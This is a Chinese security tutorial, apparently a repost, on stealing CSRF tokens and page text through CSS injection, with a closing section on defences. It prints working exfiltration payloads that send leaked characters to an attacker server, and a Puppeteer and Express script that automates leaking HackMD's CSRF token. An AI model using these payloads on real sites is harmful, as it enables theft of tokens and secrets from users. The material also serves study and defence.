# 用CSS来偷数据-CSS injection
**什么是 CSS injection？**  
CSS injection 代表的是你在一个页面上可以插入任何的 CSS 语法，或是讲得更明确一点，你可以使用 <style> 这个标签。你可能会好奇，为什么会有这种情况？  
常见的情况有两个，第一个是网站有过滤掉许多标签，但不觉得 <style> 有问题，所以没有过滤掉。例如说很多网站都会用现成的 library 来处理 sanitization，其中有一套很有名的叫做 DOMPurify  
在 DOMPurify (v2.4.0) 之中，预设就会帮你把各种危险的标签全都过滤掉，只留下一些安全的，例如说 <h1> 或是 <p> 这种，而重点是 <style> 也在预设的安全标签里面，所以如果你没有特别指定参数，在预设的情况下，<style> 是不会被过滤掉的，因此攻击者就可以注入 CSS。  
第二种情况则是虽然可以插入 HTML，但是由于 CSP（Content Security Policy）的缘故，没有办法执行 JavaScript。既然没办法执行 JavaScript，就只能退而求其次，看看有没有办法利用 CSS 做出一些恶意行为。  

## 利用 CSS 偷数据
CSS 确实是拿来装饰网页用的，但是只要结合两个特性，就可以使用 CSS 来偷数据。  
**第一个特性：属性选择器**  
在 CSS 当中，有几个选择器可以选到 “属性符合某个条件的元素”。举例来说，input[value^=a]，就可以选到 value 开头是 a 的元素。  
类似的选择器有:  
- input[value^=a] 开头是 a 的（prefix）
- input[value$=a] 结尾是 a 的（suffix）
- input[value*=a] 内容有 a 的（contains）

而第二个特性是：可以利用 CSS 发出 request，例如说载入一张服务器上的背景图片，本质上就是在发一个 request。  
假设现在页面上有一段内容是 <input name="secret" value="abc123">，而我能够插入任何的 CSS，我可以这样写：  
``` 
input[name="secret"][value^="a"] {
   background: url(https://myserver.com?q=a)
 }

 input[name="secret"][value^="b"] {
   background: url(https://myserver.com?q=b)
 }

 input[name="secret"][value^="c"] {
   background: url(https://myserver.com?q=c)
 }

 //....

 input[name="secret"][value^="z"] {
   background: url(https://myserver.com?q=z)
 }
```
因为第一条规则有顺利找到对应的元素，所以 input 的背景就会是一张服务器上的图片，而浏览器就会发 request 到 https://myserver.com?q=a。  
当在 server 收到这个 request 的时候，就知道 input 的 value 属性，第一个字符是 a，就顺利偷到了第一个字符  
这就是 CSS 之所以可以偷数据的原因，透过属性选择器加上载入图片这两个功能，就能够让 server 知道页面上某个元素的属性值是什么。  
接下来有两个问题：  
- 有什么东西好偷？
- 刚只示范偷第一个，要怎么偷第二个字符？

最常见的目标，就是 CSRF token。如果 CSRF token 被偷走，就有可能会被 CSRF 攻击,而这个 CSRF token，通常都会被放在一个 hidden input 中，像是这样：  
``` 
<form action="/action">
   <input type="hidden" name="csrf-token" value="abc123">
   <input name="username">
   <input type="submit">
 </form>
```
该怎么偷到里面的数据呢？  
**偷 hidden input**  
对于 hidden input 来说，照我们之前那样写是没有效果的：  
``` 
input[name="csrf-token"][value^="a"] {
   background: url(https://example.com?q=a)
 }
```
因为 input 的 type 是 hidden，所以这个元素不会显示在画面上，既然不会显示，那浏览器就没有必要载入背景图片，因此 server 不会收到任何 request。而这个限制非常严格，就算用 display:block !important; 也没办法盖过去  
没关系，还有别的选择器，像是这样：  
``` 
input[name="csrf-token"][value^="a"] + input {
   background: url(https://example.com?q=a)
 }
```
最后面多了一个 + input，这个加号是另外一个选择器，意思是 “选到后面的元素”，所以整个选择器合在一起，就是 “我要选 name 是 csrf-token，value 开头是 a 的 input，的后面那个 input”，也就是 <input name="username">  
真正载入背景图片的其实是别的元素，而别的元素并没有 type=hidden，所以图片会被正常载入。  
那如果后面没有其他元素怎么办？像是这样：  
``` 
<form action="/action">
   <input name="username">
   <input type="submit">
   <input type="hidden" name="csrf-token" value="abc123">
 </form>
```
以这个案例来说，在以前就真的玩完了，因为 CSS 并没有可以选到 “前面的元素” 的选择器，所以真的束手无策。  
但现在不一样了，因为我们有了 :has，这个选择器可以选到 “底下符合特殊条件的元素”，像这样：  
``` 
form:has(input[name="csrf-token"][value^="a"]){
   background: url(https://example.com?q=a)
 }
```
意思就是我要选到 “底下有（符合那个条件的 input）的 form”，所以最后载入背景的会是 form，一样也不是那个 hidden input。这个 has selector 很新，从上个月底释出的 Chrome 105 开始才正式支持，目前只剩下 Firefox 的稳定版还没支持了  

**偷 meta**  
除了把数据放在 hidden input 以外，也有些网站会把资料放在 <meta> 里面，例如说 <meta name="csrf-token" content="abc123">，meta 这个元素一样是看不见的元素，要怎么偷呢？  
has 是绝对偷得到的，可以这样偷：  
``` 
html:has(meta[name="csrf-token"][content^="a"]) {
   background: url(https://example.com?q=a);
 }
```
但除此之外，还有其他方式也偷得到。meta 虽然也看不到，但跟 hidden input 不同，我们可以自己用 CSS 让这个元素变成可见：  
``` 
 meta {
   display: block;
 }

 meta[name="csrf-token"][content^="a"] {
   background: url(https://example.com?q=a);
 }
```
这样还不够，你会发现 request 还是没有送出，这是因为 meta 在 head 底下，而 head 也有预设的 display:none 属性，因此也要帮 head 特别设置，才会让 meta “能被看到”：  
``` 
 head, meta {
   display: block;
 }

 meta[name="csrf-token"][content^="a"] {
   background: url(https://example.com?q=a);
 }
```
照上面这样写，就会看到浏览器发出 request。不过，画面上倒是没有显示任何东西，因为毕竟 content 是一个属性，而不是 HTML 的 text node，所以不会显示在画面上，但是 meta 这个元素本身其实是看得到的，这也是为什么 request 会发出去  
如果你真的想要在画面上显示 content 的话，其实也做得到，可以利用伪元素搭配 attr：  
``` 
meta:before {
     content: attr(content);
 }
```
就会看到 meta 里面的内容显示在画面上了  

**偷 HackMD 的数据**  
HackMD 的 CSRF token 放在两个地方，一个是 hidden input，另一个是 meta，内容如下：  
``` 
<meta name="csrf-token" content="h1AZ81qI-ns9b34FbasTXUq7a7_PPH8zy3RI">
```
HackMD 其实支持 <style> 的使用，这个标签不会被过滤掉，所以你是可以写任何的 style 的，而相关的 CSP 如下：  
``` 
img-src * data:;
 style-src 'self' 'unsafe-inline' https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com 
 https://fonts.gstatic.com https://*.disquscdn.com;
 font-src 'self' data: https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com https://script.hotjar.com;
```
可以看到 unsafe-inline 是允许的，所以可以插入任何的 CSS。  
确认可以插入 CSS 以后，就可以开始来准备偷数据了。还记得前面有一个问题没有回答，那就是 “该怎麽偷第一个以后的字符？”，先以 HackMD 为例回答。  
CSRF token 这种东西通常重新整理就会换一个，所以不能重新整理，而 HackMD 刚好支持即时更新，只要内容变了，会立刻反映在其他 client 的画面上，因此可以做到 “不重新整理而更新 style”，流程是这样的：  
- 准备好偷第一个字符的 style，插入到 HackMD 里面面
- 受害者打开页面
- 服务器收到第一个字节的 request
- 从服务器更新 HackMD 内容，换成偷第二个字符的 payload
- 受害者页面即时更新，载入新的 style
- 服务器收到第二个字符的 request
- 不断循环直到偷完所有字符

代码如下：  
``` 
const puppeteer = require('puppeteer');
 const express = require('express')

 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

 // Create a hackMD document and let anyone can view/edit
 const noteUrl = 'https://hackmd.io/1awd-Hg82fekACbL_ode3aasf'
 const host = 'http://localhost:3000'
 const baseUrl = host + '/extract?q='
 const port = process.env.PORT || 3000

 ;(async function() {
   const app = express()
   const browser = await puppeteer.launch({
     headless: true
   });
   const page = await browser.newPage();
   await page.setViewport({ width: 1280, height: 800 })
   await page.setRequestInterception(true);

   page.on('request', request => {
     const url = request.url()
     // cancel request to self
     if (url.includes(baseUrl)) {
       request.abort()
     } else {
       request.continue()
     }
   });
   app.listen(port, () => {
     console.log(`Listening at http://localhost:${port}`)
     console.log('Waiting for server to get ready...')
     startExploit(app, page)
   })
 })()

 async function startExploit(app, page) {
   let currentToken = ''
   await page.goto(noteUrl + '?edit');

   // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele
   await page.addStyleTag({ content: "{scroll-behavior: auto !important;}" });
   const initialPayload = generateCss()
   await updateCssPayload(page, initialPayload)
   console.log(`Server is ready, you can open ${noteUrl}?view on the browser`)

   app.get('/extract', (req, res) => {
     const query = req.query.q
     if (!query) return res.end()

     console.log(`query: ${query}, progress: ${query.length}/36`)
     currentToken = query
     if (query.length === 36) {
       console.log('over')
       return
     }
     const payload = generateCss(currentToken)
     updateCssPayload(page, payload)
     res.end()

   })
 }

 async function updateCssPayload(page, payload) {
   await sleep(300)
   await page.click('.CodeMirror-line')
   await page.keyboard.down('Meta');
   await page.keyboard.press('A');
   await page.keyboard.up('Meta');
   await page.keyboard.press('Backspace');
   await sleep(300)
   await page.keyboard.sendCharacter(payload)
   console.log('Updated css payload, waiting for next request')
 }

 function generateCss(prefix = "") {
   const csrfTokenChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'.split('')
   return `
 ${prefix}
 <style>
     head, meta {
         display: block;
     }
     ${
       csrfTokenChars.map(char => `
         meta[name="csrf-token"][content^="${prefix + char}"] {
             background: url(${baseUrl}${prefix + char})
         }
       `).join('\n')
     }
 </style>
   `
 }       
```
可以直接用 Node.js 跑起来，跑起来以后在浏览器打开相对应的文件，就可以在 terminal 看到 leak 的进度。  
不过呢，就算偷到了 HackMD 的 CSRF token，依然还是没办法 CSRF，因为 HackMD 有在 server 检查其他的 HTTP request header 如 origin 或是 referer 等等，确保 request 来自合法的地方。  

**偷到所有字符**  
想偷的数据有可能只要重新整理以后就会改变（如 CSRF token），所以必须在不重新整理的情况之下加载新的 style。  
一般的网页怎样在不能用 JavaScript 的情况下，不断动态载入新的 style？  
在 CSS 里面，你可以用 @import 去把外部的其他 style 引入进来，就像 JavaScript 的 import 那样。  
可以利用这个功能做出引入 style 的回圈，如下面的代码：  
``` 
@import url(https://myserver.com/start?len=8)
```
在 server 回传如下的 style：  
``` 
@import url(https://myserver.com/payload?len=1)
 @import url(https://myserver.com/payload?len=2)
 @import url(https://myserver.com/payload?len=3)
 @import url(https://myserver.com/payload?len=4)
 @import url(https://myserver.com/payload?len=5)
 @import url(https://myserver.com/payload?len=6)
 @import url(https://myserver.com/payload?len=7)
 @import url(https://myserver.com/payload?len=8)
```
这边虽然一次引入了 8 个，但是 “后面 7 个 request，server 都会先 hang 住，不会给 response”，只有第一个网址 https://myserver.com/payload?len=1 会回传 response，内容为之前提过的偷资料 payload：  
``` 
input[name="secret"][value^="a"] {
   background: url(https://b.myserver.com/leak?q=a)
 }

 input[name="secret"][value^="b"] {
   background: url(https://b.myserver.com/leak?q=b)
 }

 input[name="secret"][value^="c"] {
   background: url(https://b.myserver.com/leak?q=c)
 }

 //....

 input[name="secret"][value^="z"] {
   background: url(https://b.myserver.com/leak?q=z)
 }
```
浏览器收到 response 的时候，就会先载入上面这一段 CSS，载入完以后符合条件的元素就会发 request 到后端，假设第一个字是 d 好了，接著 server 这时候才回传 https://myserver.com/payload?len=2 的 response，内容为：  
``` 
input[name="secret"][value^="da"] {
   background: url(https://b.myserver.com/leak?q=da)
 }

 input[name="secret"][value^="db"] {
   background: url(https://b.myserver.com/leak?q=db)
 }

 input[name="secret"][value^="dc"] {
   background: url(https://b.myserver.com/leak?q=dc)
 }

 //....

 input[name="secret"][value^="dz"] {
   background: url(https://b.myserver.com/leak?q=dz)
 }
```
只要不断重复这些步骤，就可以把所有字符都传到 server 去，靠的就是 import 会先载入已经下载好的 resource，然后去等待还没下载好的特性  
这边有一点要特别注意，载入 style 的 domain 是 myserver.com，而背景图片的 domain 是 b.myserver.com，这是因为浏览器通常对于一个 domain 能同时载入的 request 有数量上的限制，所以如果你全部都是用 myserver.com 的话，会发现背景图片的 request 送不出去，都被 CSS import 给卡住了。因此需要设置两个 domain，来避免这种状况。  
上面这种方式在 Firefox 是行不通的，因为在 Firefox 上就算第一个的 response 先回来，也不会立刻更新 style，要等所有 request 都回来才会一起更新。
可以把第一步的 import 拿掉，然后每一个字符的 import 都用额外的 style 包着  
``` 
<style>@import url(https://myserver.com/payload?len=1)</style>
 <style>@import url(https://myserver.com/payload?len=2)</style>
 <style>@import url(https://myserver.com/payload?len=3)</style>
 <style>@import url(https://myserver.com/payload?len=4)</style>
 <style>@import url(https://myserver.com/payload?len=5)</style>
 <style>@import url(https://myserver.com/payload?len=6)</style>
 <style>@import url(https://myserver.com/payload?len=7)</style>
 <style>@import url(https://myserver.com/payload?len=8)</style>
```
而上面这样 Chrome 也是没问题的，所以统一改成上面这样，就可以同时支持两种浏览器了。  

**一次偷一个字符，太慢了吧？**  
以 HackMD 为例，CSRF token 总共有 36 个字，所以就要发 36 个 request，确实是太多了点。  
事实上一次可以偷两个字符，可以像这样：  
``` 
input[name="secret"][value^="a"] {
   background: url(https://b.myserver.com/leak?q=a)
 }

 input[name="secret"][value^="b"] {
   background: url(https://b.myserver.com/leak?q=b)
 }

 // ...
 input[name="secret"][value$="a"] {
   border-background: url(https://b.myserver2.com/suffix?q=a)
 }

 input[name="secret"][value$="b"] {
   border-background: url(https://b.myserver2.com/suffix?q=b)
 }
```
除了偷开头以外，也偷结尾，效率立刻变成两倍。要特别注意的是开头跟结尾的 CSS，一个用的是 background，另一个用的是 border-background，是不同的属性，因为如果用同一个属性的话，内容就会被其他的盖掉，最后只会发出一个 request。  
若是内容可能出现的字符不多，例如说 16 个的话，那我们可以直接一次偷两个开头加上两个结尾，总共的 CSS rule 数量为 16*16*2 = 512 个，应该还在可以接受的范围内，就能够再加速两倍。  
除此之外，也可以朝 server 那边去改善，例如说改用 HTTP/2 或甚至是 HTTP/3，都有机会能够加速 request 载入的速度，进而提升效率。  

**偷其他东西**  
除了偷属性之外，有没有办法偷到其他东西？例如说，页面上的其他文字？或甚至是 script 里面的代码？  
_unicode-range_  
有一个属性叫做 unicode-range，可以针对不同的字符，载入不同的字体。像是底下这个从 MDN 拿来的范例：  
``` 
<!DOCTYPE html>
 <html>
   <body>
     <style>
       @font-face {
         font-family: "Ampersand";
         src: local("Times New Roman");
         unicode-range: U+26;
       }

       div {
         font-size: 4em;
         font-family: Ampersand, Helvetica, sans-serif;
       }
     </style>
     <div>Me & You = Us</div>
   </body>
 </html>
```
& 的 unicode 是 U+0026，因此只有 & 这个字会用不同的字体来显示，其他都用同一个字体。  
英文跟中文如果要用不同字体来显示，就很适合用这一招。而这招也可以用来偷取页面上的文字，像这样：  
``` 
<!DOCTYPE html>
 <html>
   <body>
     <style>
       @font-face {
         font-family: "f1";
         src: url(https://myserver.com?q=1);
         unicode-range: U+31;
       }

       @font-face {
         font-family: "f2";
         src: url(https://myserver.com?q=2);
         unicode-range: U+32;
       }

       @font-face {
         font-family: "f3";
         src: url(https://myserver.com?q=3);
         unicode-range: U+33;
       }

       @font-face {
         font-family: "fa";
         src: url(https://myserver.com?q=a);
         unicode-range: U+61;
       }

       @font-face {
         font-family: "fb";
         src: url(https://myserver.com?q=b);
         unicode-range: U+62;
       }

       @font-face {
         font-family: "fc";
         src: url(https://myserver.com?q=c);
         unicode-range: U+63;
       }

       div {
         font-size: 4em;
         font-family: f1, f2, f3, fa, fb, fc;
       }
     </style>
     Secret: <div>ca31a</div>
   </body>
 </html>
```
一共发送了 4 个 request,藉由这招，可以得知页面上有：13ac 这四个字符。  
这招的局限之处也很明显，就是：  
- 我们不知道字符的顺序为何
- 重复的字符也不会知道

**字体高度差异 + first-line + scrollbar**  
这招要解决的主要是上一招碰到的问题：“没办法知道字元顺序”  
首先，我们其实可以不载入外部字体，用内置的字体就能 leak 出字符。这要怎么做到呢？我们要先找出两组内置字体，高度会不同。  
例如有一个叫做 “Comic Sans MS” 的字体，高度就比另一个 “Courier New” 高。  
假设预设字体的高度是 30px，而 Comic Sans MS 是 45px 好了。那现在我们把文字区块的高度设成 40px，并且载入字体，像这样：  
``` 
<!DOCTYPE html>
 <html>
   <body>
     <style>
       @font-face {
         font-family: "fa";
         src:local('Comic Sans MS');
         font-style:monospace;
         unicode-range: U+41;
       }
       div {
         font-size: 30px;
         height: 40px;
         width: 100px;
         font-family: fa, "Courier New";
         letter-spacing: 0px;
         word-break: break-all;
         overflow-y: auto;
         overflow-x: hidden;
       }

     </style>
     Secret: <div>DBC</div>
     <div>ABC</div>
   </body>
 </html>
```
A 比其他字符的高度都高，而且根据我们的 CSS 设定，如果内容高度超过容器高度，会出现 scrollbar。虽然上面是截图看不出来，但是下面的 ABC 有出现 scrollbar，而上面的 DBC 没有。  
其实可以帮 scrollbar 设定一个外部的背景：  
``` 
div::-webkit-scrollbar {
     background: blue;
 }

 div::-webkit-scrollbar:vertical {
     background: url(https://myserver.com?q=a);
 }
```
如果 scrollbar 有出现，我们的 server 就会收到 request。如果 scrollbar 没出现，就不会收到 request。  
更进一步来说，当我把 div 套用 “fa” 字体时，如果画面上有 A，就会出现 scrollbar，server 就会收到 request。如果画面上没有 A，就什么事情都不会发生。  
如果一直重复载入不同字体，那我在 server 就能知道画面上有什么字符，这点跟刚刚我们用 unicode-range 能做到的事情是一样的。  
那要怎么解决顺序的问题呢？  
可以先把 div 的宽度缩减到只能显示一个字符，这样其他字符就会被放到第二行去，再搭配 ::first-line 这个 selector，就可以特别针对第一行做样式的调整，像是这样：  
``` 
<!DOCTYPE html>
 <html>
   <body>
     <style>
       @font-face {
         font-family: "fa";
         src:local('Comic Sans MS');
         font-style:monospace;
         unicode-range: U+41;
       }
       div {
         font-size: 0px;
         height: 40px;
         width: 20px;
         font-family: fa, "Courier New";
         letter-spacing: 0px;
         word-break: break-all;
         overflow-y: auto;
         overflow-x: hidden;
       }

       div::first-line{
         font-size: 30px;
       }

     </style>
     Secret: <div>CBAD</div>
   </body>
```
页面上你就只会看到一个 “C” 的字符，因为我们先用 font-size: 0px 把所有字符的尺寸都设为 0，再用 div::first-line 去做调整，让第一行的 font-size 变成 30px。换句话说，只有第一行的字元能看到，而现在的 div 宽度只有 20px，所以只会出现第一个字符。  
再运用刚刚学会的那招，去载入看看不同的字体。当我载入 fa 这个字体时，因为画面上没有出现 A，所以不会有任何变化。但是当我载入 fc 这个字体时，画面上有 C，所以就会用 Comic Sans MS 来显示 C，高度就会变高，scrollbar 就会出现，就可以利用它来发出 request，像这样：  
``` 
div {
   font-size: 0px;
   height: 40px;
   width: 20px;
   font-family: fc, "Courier New";
   letter-spacing: 0px;
   word-break: break-all;
   overflow-y: auto;
   overflow-x: hidden;
   --leak: url(http://myserver.com?C);
 }

 div::first-line{
   font-size: 30px;
 }

 div::-webkit-scrollbar {
   background: blue;
 }

 div::-webkit-scrollbar:vertical {
   background: var(--leak);
 }
```
怎么样不断使用新的 font-family 呢？用 CSS animation 就可以做到，你可以用 CSS animation 不断载入不同的 font-family 以及指定不同的 –leak 变量。  
知道了第一个字符以后，把 div 的宽度变长，例如说变成 40px，就能容纳两个字符，因此第一行就会是前两个字，接着再用一样的方式载入不同的 font-family，就能 leak 出第二个字符，详细流程如下：  
- 假设页面上是 ACB
- 调整宽度为 20px，第一行只出现第一个字符 A
- 载入字体 fa，因此 A 用较高的字体显示，出现 scrollbar，载入 scrollbar 背景，传送 request 给 server
- 载入字体 fb，但是 B 没有出现在画面上，因此没有任何变化。
- 载入字体 fc，但是 C 没有出现在画面上，因此没有任何变化。
- 调整宽度为 40px，第一行出现两个字符 AC
- 载入字体 fa，因此 A 用较高的字体显示，出现 scrollbar，此时应该是因为这个背景已经载入过，所以不会发送新的 request
- 载入字体 fb，没出现在画面上，没任何变化
- 载入字体 fc，C 用较高的字体显示，出现 scrollbar 并且载入背景
- 调整宽度为 60px，ACB 三个字元都出现在第一行
- 载入字体 fa，同第七步
- 载入字体 fb，B 用较高的字体显示，出现 scrollbar 并且载入背景
- 载入字体 fc，C 用较高的字体显示，但因为已经载入过相同背景，不会发送 request
- 结束

从上面流程中可以看出 server 会依序收到 A, C, B 三个 reqeust，代表了画面上字符的顺序。而不断改变宽度以及 font-family 都可以用 CSS animation 做到。  
这个解法虽然解决了 “不知道字元顺序” 的问题，但依然无法解决重复字符的问题，因为重复的字符不会再发出 request。  

**ligature + scrollbar**  
这一招可以解决上面所有问题，达成 “知道字符顺序，也知道重复字符” 的目标，能够偷到完整的文字。  
要理解怎么偷之前，要先知道一个专有名词，叫做连字（ligature），在某些字型当中，会把一些特定的组合 render 成连在一起的样子  
那这个对我们有什么帮助呢？  
可以自己制作出一个独特的字体，把 ab 设定成连字，并且 render 出一个超宽的元素。接着，我们把某个 div 宽度设成固定，然后结合刚刚 scrollbar 那招，也就是：“如果 ab 有出现，就会变很宽，scrollbar 就会出现，就可以载入 request 告诉 server；如果没出现，那 scrollbar 就不会出现，没有任何事情发生”。  
假设页面上有 acc 这三个字：  
- 载入有连字 aa 的字体，没事发生
- 载入有连字 ab 的字体，没事发生
- 载入有连字 ac 的字体，成功 render 超宽的画面，scrollbar 出现，载入 server 图片
- server 知道页面上有 ac
- 载入有连字 aca 的字体，没事发生
- 载入有连字 acb 的字体，没事发生
- 载入有连字 acc 的字体，成功 render，scrollbar 出现，传送结果给 server
- server 知道页面上有 acc
- 透过连字结合 scrollbar，我们可以一个字符一个字符，慢慢 leak 出页面上所有的字，甚至连 JavaScript 的代码都可以！

``` 
head, script {
   display: block;
 }
```
只要加上这个 CSS，就可以让 script 内容也显示在画面上，因此我们也可以利用同样的技巧，偷到 script 的内容！  
在实战上的话，你可以用 SVG 搭配其他工具，在 server 端迅速产生字体.简易版 demo：  
``` 
 <!DOCTYPE html>
 <html lang="en">
 <body>
   <script>
     var secret = "abc123"
   </script>
   <hr>
   <script>
     var secret2 = "cba321"
   </script>
   <svg>
     <defs>
     <font horiz-adv-x="0">
       <font-face font-family="hack" units-per-em="1000" />
         <glyph unicode='"a' horiz-adv-x="99999" d="M1 0z"/>
       </font>
     </defs>
   </svg>
   <style>
     script {
       display: block;
       font-family:"hack";
       white-space:n owrap;
       overflow-x: auto;
       width: 500px;
       background:lightblue;
     }

     script::-webkit-scrollbar {
       background: blue;
     }

   </style>
 </body>
 </html>
```
用 script 放了两段 JS，里面内容分别是 var secret = "abc123" 跟 var secret2 = "cba321"，接着利用 CSS 载入我准备好的字体，只要有 "a 的连字，就会宽度超宽。  
因为内容是 var secret = "abc123"，所以符合了 "a 的连字，因此宽度变宽，scrollbar 出现。  
下面因为没有 a，所以 scrollbar 没出现（有 a 的地方都会缺字，应该跟我没有定义其他的 glyph 有关，但不影响结果）  
只要把 scrollbar 的背景换成 URL，就可以从 server 端知道 leak 的结果。  

**防御方式**  
最简单明了的当然就是直接把 style 封起来不给用，基本上就不会有 CSS injection 的问题  
如果真的要开放 style，也可以用 CSP 来阻挡一些资源的载入，例如说 font-src 就没有必要全开，style-src 也可以设置 allow list，就能够挡住 @import 这个语法。  
再来，也可以考虑到 “如果页面上的东西被拿走，会发生什么事情”，例如说 CSRF token 被拿走，最坏就是 CSRF，此时就可以实作更多的防护去阻挡 CSRF，就算攻击者取得了 CSRF token，也没办法 CSRF（例如说多检查 origin header 之类的）。  


原文:  
[用 CSS 来偷数据 - CSS injection（上）](https://mp.weixin.qq.com/s/CxPqLt_GYmfKwXC38YsKMQ)
[用 CSS 来偷数据 - CSS injection（下）](https://mp.weixin.qq.com/s/mLhufG2ebZCJstaQ0a5EmQ)
